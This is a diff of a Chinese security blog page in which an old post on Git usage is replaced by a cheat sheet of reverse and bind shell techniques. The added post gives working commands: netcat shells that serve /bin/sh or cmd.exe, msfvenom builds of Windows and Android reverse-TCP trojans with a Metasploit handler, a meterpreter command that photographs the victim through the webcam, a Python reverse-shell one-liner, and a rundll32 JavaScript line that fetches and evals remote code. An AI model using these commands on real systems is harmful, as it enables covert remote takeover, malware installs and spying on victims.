@@ -26,7 +26,7 @@
 
 
 
-  <meta name="keywords" content="git," />
+  <meta name="keywords" content="shell," />
 
 
 
@@ -35,34 +35,25 @@
   <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.5.1" />
 
 
-<meta name="description" content="授权生成密钥和公钥
-ssh-keygen -t rsa -C &quot;yourmail@g.com&quot;
-注：    
-ssh-keygen在git的安装目录的&quot;bin&quot;目录下。
-windows下填写路径是填写绝对路径，公钥密钥放在git安装      
-目录下的&quot;.ssh&quot;文件夹中。例如`D:\Git\.ssh\id_rsa.`    
-此时会创建D:\Git\.ssh文件夹并在其中生成名为id_rsa的">
+<meta name="description" content="渗透过程中经常会有需要反弹shell，为什么要用到反弹shell，我们的目标主机在没有外网IP但可以和外网进行通信的时候可以使用反弹shell使其主动连接一个外网服务，我们可以通过编写这个服务来达到各种目的。在这里记录一下正向及反弹shell的各种姿势。
+NetCat反弹shell#服务端
+nc -l -p 1234 -e /bin/sh   #目标主机为linux系统
+nc -l -p 1234">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Git使用记录">
-<meta property="og:url" content="http://yoursite.com/2015/08/10/Git使用记录/index.html">
+<meta property="og:title" content="shell的各种姿势">
+<meta property="og:url" content="http://yoursite.com/2016/01/11/反弹shell的各种姿势/index.html">
 <meta property="og:site_name" content="FengGe">
-<meta property="og:description" content="授权生成密钥和公钥
-ssh-keygen -t rsa -C &quot;yourmail@g.com&quot;
-注：    
-ssh-keygen在git的安装目录的&quot;bin&quot;目录下。
-windows下填写路径是填写绝对路径，公钥密钥放在git安装      
-目录下的&quot;.ssh&quot;文件夹中。例如`D:\Git\.ssh\id_rsa.`    
-此时会创建D:\Git\.ssh文件夹并在其中生成名为id_rsa的">
-<meta property="og:updated_time" content="2015-12-04T07:29:11.553Z">
+<meta property="og:description" content="渗透过程中经常会有需要反弹shell，为什么要用到反弹shell，我们的目标主机在没有外网IP但可以和外网进行通信的时候可以使用反弹shell使其主动连接一个外网服务，我们可以通过编写这个服务来达到各种目的。在这里记录一下正向及反弹shell的各种姿势。
+NetCat反弹shell#服务端
+nc -l -p 1234 -e /bin/sh   #目标主机为linux系统
+nc -l -p 1234">
+<meta property="og:updated_time" content="2016-01-13T07:28:36.502Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Git使用记录">
-<meta name="twitter:description" content="授权生成密钥和公钥
-ssh-keygen -t rsa -C &quot;yourmail@g.com&quot;
-注：    
-ssh-keygen在git的安装目录的&quot;bin&quot;目录下。
-windows下填写路径是填写绝对路径，公钥密钥放在git安装      
-目录下的&quot;.ssh&quot;文件夹中。例如`D:\Git\.ssh\id_rsa.`    
-此时会创建D:\Git\.ssh文件夹并在其中生成名为id_rsa的">
+<meta name="twitter:title" content="shell的各种姿势">
+<meta name="twitter:description" content="渗透过程中经常会有需要反弹shell，为什么要用到反弹shell，我们的目标主机在没有外网IP但可以和外网进行通信的时候可以使用反弹shell使其主动连接一个外网服务，我们可以通过编写这个服务来达到各种目的。在这里记录一下正向及反弹shell的各种姿势。
+NetCat反弹shell#服务端
+nc -l -p 1234 -e /bin/sh   #目标主机为linux系统
+nc -l -p 1234">
 
 
 <script type="text/javascript" id="hexo.configuration">
@@ -72,7 +63,7 @@ windows下填写路径是填写绝对路径，公钥密钥放在git安装
   };
 </script>
 
-  <title> Git使用记录 | FengGe </title>
+  <title> shell的各种姿势 | FengGe </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -211,7 +202,7 @@ windows下填写路径是填写绝对路径，公钥密钥放在git安装
           
           
             
-              Git使用记录
+              shell的各种姿势
             
           
         </h1>
@@ -220,8 +211,8 @@ windows下填写路径是填写绝对路径，公钥密钥放在git安装
       <div class="post-meta">
         <span class="post-time">
           发表于
-          <time itemprop="dateCreated" datetime="2015-08-10T11:20:24+08:00" content="2015-08-10">
-            2015-08-10
+          <time itemprop="dateCreated" datetime="2016-01-11T15:32:41+08:00" content="2016-01-11">
+            2016-01-11
           </time>
         </span>
 
@@ -231,8 +222,8 @@ windows下填写路径是填写绝对路径，公钥密钥放在git安装
           
             <span class="post-comments-count">
               &nbsp; | &nbsp;
-              <a href="/2015/08/10/Git使用记录/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count ds-thread-count" data-thread-key="2015/08/10/Git使用记录/" itemprop="commentsCount"></span>
+              <a href="/2016/01/11/反弹shell的各种姿势/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="2016/01/11/反弹shell的各种姿势/" itemprop="commentsCount"></span>
               </a>
             </span>
           
@@ -246,30 +237,39 @@ windows下填写路径是填写绝对路径，公钥密钥放在git安装
       
 
       
-        <span itemprop="articleBody"><h2 id="授权">授权</h2><p>生成密钥和公钥</p>
-<pre><code>ssh-keygen -t rsa -<span class="keyword">C</span> <span class="string">"yourmail@g.com"</span>
-</code></pre><p>注：    </p>
-<pre><code>ssh-keygen在git的安装目录的"bin"目录下。
-windows下填写路径是填写绝对路径，公钥密钥放在git安装      
-目录下的".ssh"文件夹中。例如`D:<span class="command">\Git</span><span class="command">\.</span>ssh<span class="command">\id</span>_rsa.`    
-此时会创建D:<span class="command">\Git</span><span class="command">\.</span>ssh文件夹并在其中生成名为id_rsa的一对密钥。
-其中将公钥添加到github.com网站中就可以通过命令行对其进行各种操作。
-</code></pre><h2 id="登录github-com添加远程仓库。">登录github.com添加远程仓库。</h2><p>使用免费的只能选择public模式，添加title和description。完成并记录git clone url（形如：git@github.com\username\projectname）</p>
-<pre><code>git remote add origin git<span class="annotation">@github</span>.<span class="string">com:</span>fengge98\test.git
-</code></pre><p>创建一个名为origin的远程库关联到账户fengge98下名为test.git的工程</p>
-<pre><code><span class="label">git</span> <span class="keyword">push </span>-u origin master
-</code></pre><p>第一次由于远程仓库没有内容使用-u参数，将当前分支master中commit后的内容推送到origin远程库，并将远程库master和当前master关联方便以后的推送和拉取</p>
-<h2 id="本地编写代码">本地编写代码</h2><pre><code>git branch asdf
-git checkout adsf       <span class="preprocessor">#创建名为asdf的分支 并切换到asd</span>
-git checkout -b asdf    <span class="preprocessor">#创建名为asdf的分支 并切换到asd</span>
-git <span class="keyword">add</span> test1.py
-git <span class="keyword">add</span> test2.py
-...
-git commit -m <span class="string">"description"</span>
-<span class="keyword">add</span>并commit                <span class="preprocessor">#其中description部分填写当前版本的改动 </span>
-git checkout master      <span class="preprocessor">#切换到主分支</span>
-git merge asdf           <span class="preprocessor">#将adsf提交的改动合并到master分支</span>
-git <span class="keyword">push</span>                   <span class="preprocessor">#将当前版本代码推送到远程库</span>
+        <span itemprop="articleBody"><p>渗透过程中经常会有需要反弹shell，为什么要用到反弹shell，我们的目标主机在没有外网IP但可以和外网进行通信的时候可以使用反弹shell使其主动连接一个外网服务，我们可以通过编写这个服务来达到各种目的。在这里记录一下正向及反弹shell的各种姿势。</p>
+<h2 id="NetCat反弹shell">NetCat反弹shell</h2><pre><code><span class="comment">#服务端</span>
+nc -l -p <span class="number">1234</span> -e /bin/sh   <span class="comment">#目标主机为linux系统</span>
+nc -l -p <span class="number">1234</span> -e <span class="constant">C</span><span class="symbol">:/Windows/System/cmd</span>.exe <span class="comment">#目标主机为Windows系统</span>
+
+<span class="comment">#目标主机</span>
+nc ip <span class="number">1234</span>
+</code></pre><h2 id="msf反弹shell安卓">msf反弹shell安卓</h2><pre><code>payload生成木马
+
+shell&gt; msfvenom -l #查看可用payload
+shell&gt; msfvenom -<span class="tag">p</span> windows/x64/shell/reverse_tcp LHOST=ip LPORT=port -f exe -o /var/www/shell<span class="class">.exe</span>                #生成exe文件放到windows系统
+msfvenom -<span class="tag">p</span> android/meterpreter/reverse_tcp LHOST=ip  LPORT=port -o /var/www/<span class="number">1234</span><span class="class">.apk</span> #放到手机安装
+
+进入msfconsole
+msf &gt; use multi/handler
+msf <span class="function"><span class="title">exploit</span><span class="params">(handler)</span></span> &gt;  set payload windows/x64/shell/reverse_tcp
+msf <span class="function"><span class="title">exploit</span><span class="params">(handler)</span></span> &gt;  set LHOST <span class="number">0.0</span>.<span class="number">0.0</span>
+msf <span class="function"><span class="title">exploit</span><span class="params">(handler)</span></span> &gt;    set LPORT port
+msf <span class="function"><span class="title">exploit</span><span class="params">(handler)</span></span> &gt;  exploit
+
+meterpreter&gt; webcam_snap -<span class="tag">i</span> <span class="number">2</span> -<span class="tag">p</span> /var/www/<span class="number">1</span><span class="class">.jap</span>   #照一张照片放在根目录
+</code></pre><h2 id="python反弹shell">python反弹shell</h2><pre><code>在服务器端监听<span class="number">1234</span>
+nc -l <span class="number">1234</span>
+在攻击目标运行
+<span class="built_in">#</span>linux系统
+python -c '<span class="built_in">import</span> socket,subprocess,os;s=socket.socket<span class="params">(socket.AF_INET,socket.SOCK_STREAM)</span>;s.connect<span class="params">(<span class="params">(<span class="string">"10.0.0.1"</span>,<span class="number">1234</span>)</span>)</span>;os.dup2<span class="params">(s.fileno<span class="params">()</span>,<span class="number">0</span>)</span>; os.dup2<span class="params">(s.fileno<span class="params">()</span>,<span class="number">1</span>)</span>; os.dup2<span class="params">(s.fileno<span class="params">()</span>,<span class="number">2</span>)</span>;p=subprocess.call<span class="params">([<span class="string">"/bin/sh"</span>,<span class="string">"-i"</span>])</span>;'
+</code></pre><h2 id="rundll-exe加载js反弹shell">rundll.exe加载js反弹shell</h2><p><a href="http://drops.wooyun.org/tips/11764" target="_blank" rel="external">JavaScript Backdoor</a>–三好学生</p>
+<pre><code><span class="preprocessor">#window服务器上运行ps1脚本</span>
+https:<span class="comment">//gist.github.com/subTee/f1603fa5c15d5f8825c0</span>
+
+<span class="preprocessor">#攻击目标机器上执行</span>
+
+rundll32.exe javascript:<span class="string">"\..\mshtml,RunHTMLApplication "</span>;document.write();h=<span class="keyword">new</span>%<span class="number">20</span>ActiveXObject(<span class="string">"WinHttp.WinHttpRequest.5.1"</span>);h.Open(<span class="string">"GET"</span>,<span class="string">"http://192.168.174.131/connect"</span>,<span class="literal">false</span>);<span class="keyword">try</span>{h.Send();B=h.ResponseText;eval(B);}<span class="keyword">catch</span>(e{<span class="keyword">new</span>%<span class="number">20</span>ActiveXObject(<span class="string">"WScript.Shell"</span>).Run(<span class="string">"cmd /c taskkill /f /im rundll32.exe"</span>,<span class="number">0</span>,<span class="literal">true</span>);}
 </code></pre></span>
       
     </div>
@@ -278,7 +278,7 @@ git <span class="keyword">push</span>                   <span class="preprocesso
       
         <div class="post-tags">
           
-            <a href="/tags/git/" rel="tag">#git</a>
+            <a href="/tags/shell/" rel="tag">#shell</a>
           
         </div>
       
@@ -287,13 +287,13 @@ git <span class="keyword">push</span>                   <span class="preprocesso
         <div class="post-nav">
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2015/08/10/SqlMap命令-全/" rel="prev">SqlMap命令-全</a>
+              <a href="/2016/01/13/NESSUS使用记录/" rel="prev">NESSUS使用记录</a>
             
           </div>
 
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2015/08/10/反射型xss/" rel="next">反射型XSS(心伤的瘦子)</a>
+              <a href="/2016/01/05/谈谈序列化和反序列化的问题/" rel="next">谈谈序列化和反序列化引发的问题</a>
             
           </div>
         </div>
@@ -318,8 +318,8 @@ git <span class="keyword">push</span>                   <span class="preprocesso
         
           <div class="comments" id="comments">
             
-              <div class="ds-thread" data-thread-key="2015/08/10/Git使用记录/"
-                   data-title="Git使用记录" data-url="http://yoursite.com/2015/08/10/Git使用记录/">
+              <div class="ds-thread" data-thread-key="2016/01/11/反弹shell的各种姿势/"
+                   data-title="shell的各种姿势" data-url="http://yoursite.com/2016/01/11/反弹shell的各种姿势/">
               </div>
             
           </div>
@@ -430,7 +430,7 @@ git <span class="keyword">push</span>                   <span class="preprocesso
           <div class="post-toc">
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#授权"><span class="nav-number">1.</span> <span class="nav-text">授权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#登录github-com添加远程仓库。"><span class="nav-number">2.</span> <span class="nav-text">登录github.com添加远程仓库。</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#本地编写代码"><span class="nav-number">3.</span> <span class="nav-text">本地编写代码</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#NetCat反弹shell"><span class="nav-number">1.</span> <span class="nav-text">NetCat反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#msf反弹shell安卓"><span class="nav-number">2.</span> <span class="nav-text">msf反弹shell安卓</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#python反弹shell"><span class="nav-number">3.</span> <span class="nav-text">python反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rundll-exe加载js反弹shell"><span class="nav-number">4.</span> <span class="nav-text">rundll.exe加载js反弹shell</span></a></li></ol></div>
             
           </div>
           <div class="post-toc-indicator-bottom post-toc-indicator"></div>
